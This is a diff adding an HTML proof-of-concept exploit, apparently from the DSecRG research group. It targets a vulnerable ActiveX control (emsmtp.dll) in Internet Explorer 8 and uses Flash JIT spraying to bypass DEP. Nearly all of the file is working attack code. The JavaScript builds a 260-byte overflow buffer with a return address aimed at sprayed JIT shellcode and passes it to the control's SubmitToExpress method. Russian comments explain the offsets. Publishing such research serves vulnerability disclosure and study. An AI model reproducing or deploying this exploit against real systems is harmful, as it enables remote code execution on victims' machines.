@@ -1,0 +1,49 @@
+<HTML>
+	<HEAD>
+	<TITLE>"DSecRG": ActiveX IE8-hard-DEP Sploit [ActionScript JitSpray]</TITLE>
+	</HEAD>
+	<BODY>
+
+	<OBJECT id='vuln' classid='clsid:68AC0D5F-0424-11D5-822F-00C04F6BA8D9'></OBJECT>
+	<OBJECT id='spray' classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="780" height="420"></OBJECT>
+	<!--
+		Simple JIT PoC
+
+	vuln 	- emsmtp.dll v6.0.1 - vuln. ActiveX
+	spray	- Flash10 ))
+
+	by Alexey Sintsov
+		dookie@inbox.ru
+		a.sintsov@dsec.ru
+	
+	DSecRG - Digital Security Research Group [dsecrg.com]
+
+	-->
+	<SCRIPT>
+    
+
+	
+	function Exploit(){
+	
+		var bf=unescape("%63"); //начальная часть буфера - сссссс...260...cccccc
+		var buf="";	
+		while (buf.length<260) buf=buf+bf;
+		
+		//CALL [ESI+CC]
+		buf+=unescape("%0a%0a%1a%1a"); //ESI -- по этому адресу нули. CALL [ESI+CC] не будет
+		buf+="ffff"+unescape("%01%01%1a%1a");// Адрес возврата. 0x090901001 - адрес с JIT shellcode (сдвиг на 1)
+		alert('Try me?');
+		vuln.SubmitToExpress(buf);
+		
+	}
+
+		
+	spray.Movie="jit-spray.swf";
+	
+	setTimeout('Exploit()',10000);
+      	
+	 
+	
+	</SCRIPT>
+</BODY>
+</HTML>
